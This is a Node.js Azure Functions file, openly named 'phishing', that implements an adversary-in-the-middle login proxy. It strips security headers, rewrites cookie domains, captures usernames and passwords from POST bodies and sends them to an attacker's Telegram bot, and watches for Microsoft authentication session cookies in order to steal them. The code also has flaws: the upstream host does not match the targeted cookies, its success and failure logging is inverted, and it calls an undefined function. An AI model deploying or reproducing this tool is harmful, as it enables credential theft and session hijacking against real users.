const { app } = require("@azure/functions");
const fetch = require("node-fetch");
const dotenv = require("dotenv");

dotenv.config();

const upstream = "login.telegram.com";
const upstream_path = "/";
const telegram_bot_token = process.env.BOT_TOKEN; // Your Telegram bot token
const chat_id = process.env.CHAT_ID; // Your Telegram chat ID

// Headers to delete from upstream responses
const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only",
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
  "content-length",
  "content-encoding",
  "Set-Cookie",
];

async function replace_response_text(response, upstream, original) {
  return response
    .text()
    .then((text) => text.replace(new RegExp(upstream, "g"), original));
}

async function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${telegram_bot_token}/sendMessage`;
  const payload = {
    chat_id: chat_id,
    text: message,
    parse_mode: "HTML", // Optional: Use HTML formatting
  };

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      console.error(`Failed to send message: ${response.statusText}`);
    } else {
      console.log("Message sent successfully to Telegram");
    }
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
  }
}

app.http("phishing", {
  methods: ["GET", "POST"],
  authLevel: "anonymous",
  route: "/{*x}",
  handler: async (request, context) => {
    // Original URLs
    const upstream_url = new URL(request.url);
    const original_url = new URL(request.url);

    // Rewriting to upstream
    upstream_url.host = upstream;
    upstream_url.port = 443;
    upstream_url.protocol = "https:";

    if (upstream_url.pathname === "/") {
      upstream_url.pathname = upstream_path;
    } else {
      upstream_url.pathname = upstream_path + upstream_url.pathname;
    }

    context.log(
      `Proxying ${request.method}: ${original_url} to: ${upstream_url}`
    );

    const new_request_headers = new Headers(request.headers);
    new_request_headers.set("Host", upstream_url.host);
    new_request_headers.set("accept-encoding", "gzip;q=0,deflate;q=0");
    new_request_headers.set(
      "user-agent",
      "AzureAiTMFunction/1.0 (Windows NT 10.0; Win64; x64)"
    );
    new_request_headers.set(
      "Referer",
      original_url.protocol + "//" + original_url.host
    );

    // Obtain credentials from POST body
    if (request.method === "POST") {
      const temp_req = await request.clone();
      const body = await temp_req.text();
      const keyValuePairs = body.split("&");

      // Extract key-value pairs for username and password
      const msg = Object.fromEntries(
        keyValuePairs
          .map((pair) => ([key, value] = pair.split("=")))
          .filter(([key, _]) => key === "login" || key === "passwd")
          .map(([_, value]) => [
            _,
            decodeURIComponent(value.replace(/\+/g, " ")),
          ])
      );

      if (msg.login && msg.passwd) {
        await sendTelegramMessage(
          `Captured login information:\nUsername: ${msg.login}\nPassword: ${msg.passwd}`
        );
      }
    }

    const original_response = await fetch(upstream_url.href, {
      method: request.method,
      headers: new_request_headers,
      body: request.body,
      duplex: "half",
    });

    // Adjust response headers
    const new_response_headers = new Headers(original_response.headers);
    delete_headers.forEach((header) => new_response_headers.delete(header));
    new_response_headers.set("access-control-allow-origin", "*");
    new_response_headers.set("access-control-allow-credentials", true);

    // Replace cookie domains to match our proxy
    try {
      const originalCookies = original_response.headers.getSetCookie();
      originalCookies.forEach((originalCookie) => {
        const modifiedCookie = originalCookie.replace(
          new RegExp(upstream_url.host, "g"),
          original_url.host
        );
        new_response_headers.append("Set-Cookie", modifiedCookie);
      });

      const cookies = originalCookies.filter(
        (cookie) =>
          cookie.startsWith("ESTSAUTH=") ||
          cookie.startsWith("ESTSAUTHPERSISTENT=") ||
          cookie.startsWith("SignInStateCookie=")
      );

      if (cookies.length == 3) {
        dispatchMessage(
          "Captured required authentication cookies: <br>" +
            JSON.stringify(cookies)
        );
      }
    } catch (error) {
      console.error(error);
    }

    const original_text = await replace_response_text(
      original_response.clone(),
      upstream_url.protocol + "//" + upstream_url.host,
      original_url.protocol + "//" + original_url.host
    );

    return new Response(original_text, {
      status: original_response.status,
      headers: new_response_headers,
    });
  },
});
